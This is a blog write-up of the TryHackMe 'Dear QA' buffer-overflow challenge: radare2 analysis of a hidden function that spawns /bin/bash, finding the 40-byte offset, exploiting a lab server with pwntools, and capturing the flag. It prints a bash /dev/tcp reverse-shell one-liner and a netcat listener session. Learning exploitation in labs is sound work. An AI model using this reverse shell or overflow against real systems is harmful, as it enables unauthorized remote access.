---
title: "Dear QA"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

<img src='dqa.png' alt='dqa' width=200 >

This is a binary exploitation challenge with a buffer overflow vulnerabily

Reminds me of '0xDiablos' challenge I did on hackthebox

Local exploitation first, then remote/development exploit

## Local exploitation

We get informations first

```
└──╼ $file DearQA.DearQA
DearQA.DearQA: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dae71dcf7b3fe612fe9f7a4d0fa068ff3fc93bd, not stripped
```

```
└──╼ $checksec DearQA.DearQA
[*] '/home/yourUser/Desktop/DearQA.DearQA'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
Then the basics

```
└──╼ $strings  DearQA.DearQA
/lib64/ld-linux-x86-64.so.2
libc.so.6
fflush
__isoc99_scanf
puts
printf
stdout
execve
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.2.5
fffff.
[]A\A]A^A_
Congratulations!
You have entered in the secret function!
/bin/bash
Welcome dearQA
I am sysadmin, i am new in developing
What's your name: 
Hello: %s
;*3$"

...

```

A secret function? interresting!

At this point I could fire up Ghidra or IDA, but I find those too powerful

I am trying to learn as much as possible so I stick to simpler tools like gdb and r2

So for the moment I use r2 and analyse the binary (I already gave execution permission and tested it)

```
└──╼ $r2 -d ./DearQA.DearQA
Process with PID 19964 started...
= attach 19964 19964
bin.baddr 0x00400000
Using 0x400000
asm.bits 64

[0x7f6147a2f090]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for vtables
[TOFIX: aaft can't run in debugger mode.ions (aaft)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.

[0x7f6147a2f090]> afl
0x00400590    1 41           entry0
0x00400540    1 6            sym.imp.__libc_start_main
0x004005c0    4 50   -> 41   sym.deregister_tm_clones
0x00400600    4 58   -> 55   sym.register_tm_clones
0x00400640    3 28           sym.__do_global_dtors_aux
0x00400660    4 38   -> 35   entry.init0
0x004007a0    1 2            sym.__libc_csu_fini
0x00400686    1 61           sym.vuln
0x00400520    1 6            sym.imp.puts
0x00400570    1 6            sym.imp.fflush
0x00400550    1 6            sym.imp.execve
0x004007a4    1 9            sym._fini
0x00400730    4 101          sym.__libc_csu_init
0x004006c3    1 109          main
0x00400530    1 6            sym.imp.printf
0x00400580    1 6            sym.imp.__isoc99_scanf
0x004004f0    3 26           sym._init
0x00400560    1 6            loc.imp.__gmon_start__
```
`main` is usually a good start, but it does nothing special 

The strings were taling about a "secret function"

Among the symbols we got a `sym.vuln` function that look interresting

```
[0x7f6147a2f090]> pdf @sym.vuln
┌ 61: sym.vuln ();
│           0x00400686      55             push rbp
│           0x00400687      4889e5         mov rbp, rsp
│           0x0040068a      bfb8074000     mov edi, str.Congratulations_ ; 0x4007b8 ; "Congratulations!"
│           0x0040068f      e88cfeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400694      bfd0074000     mov edi, str.You_have_entered_in_the_secret_function_ ; 0x4007d0 ; "You have entered in the secret function!"
│           0x00400699      e882feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040069e      488b056b0520.  mov rax, qword [obj.stdout] ; obj.stdout__GLIBC_2.2.5
│                                                                      ; [0x600c10:8]=0
│           0x004006a5      4889c7         mov rdi, rax
│           0x004006a8      e8c3feffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           0x004006ad      ba00000000     mov edx, 0
│           0x004006b2      be00000000     mov esi, 0
│           0x004006b7      bff9074000     mov edi, str._bin_bash      ; 0x4007f9 ; "/bin/bash"
│           0x004006bc      e88ffeffff     call sym.imp.execve
│           0x004006c1      5d             pop rbp
└           0x004006c2      c3             ret
```
Bingo! that's it! But It's never called in main ( or anywhere ? )

How could we reach it? the answer is: `Buffer Overflow`

When I executed the binary and saw it was taking input I immediately suspected it

You know already how to test for BOF, mad-long inputs!

You can generate them with any tool or do it manually (barbaric)

But it's important to find the right offset (how many characters make a BOF ?)

I found my offset at `40` characters

```
└──╼ $./DearQA.DearQA
Welcome dearQA
I am sysadmin, i am new in developing
What's your name: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Hello: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Erreur de segmentation

```

So now We got what we need! Our objective is to jump to the `vuln` function address

from r2 we got it! it's `0x00400686`

so we just add it to our payload (convert it to little endian first)

I wrote a python script for that, using `pwntools` (I like pwntools)



## Remote exploitation

I won't say much here, as we did the hardest part already

We just have to connect to the remote server and send our payload

`pwntools` can do that too. I adapt my script and use it with `python3`

```
└──╼ $python3 bufferoverflow.py
[*] '/home/nair0lf32/Desktop/Stuff/THM/DearQA/DearQA.DearQA'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to 10.10.81.146 on port 5700: Done
[*] Initialisation of BOF attack
/home/nair0lf32/Desktop/Stuff/THM/DearQA/bufferoverflow.py:18: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  connection.recvuntil("What's your name: ")
[*] Payload sent
[*] Switching to interactive mode



ctf@dearqa:/home/ctf$ $  

```
And we did it! the secret function gave us a shell (like shown in local)

Now we have access to the server but we cant see our commands output

We can get a proper shell then

```
ctf@dearqa:/home/ctf$ $ bash -c 'exec bash -i &>/dev/tcp/10.8.226.203/4444 <&1'

$  
```

Then our listenner got us in

```
└──╼ $nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 48729
bash: cannot set terminal process group (445): Inappropriate ioctl for device
bash: no job control in this shell
ctf@dearqa:/home/ctf$ ls
ls
DearQA
dearqa.c
flag.txt
```

```ctf@dearqa:/home/ctf$ cat flag.txt
cat flag.txt
THM{Fl4G_Fr0m_Q4_t0_D3v}
```
I am starting to really like those pwn challenges!

Doing further readings I learnt that actually when you examine the memory addresses (gdb or objdump)

after the segfault, you get the offset at 40, but the buffer size is actually 32 bytes

The next 8 bytes are used to reach the RSP and access the vuln function

It doesnt change much as we can fill any characters in the RSP, but it's good to know

Keep learning folks!
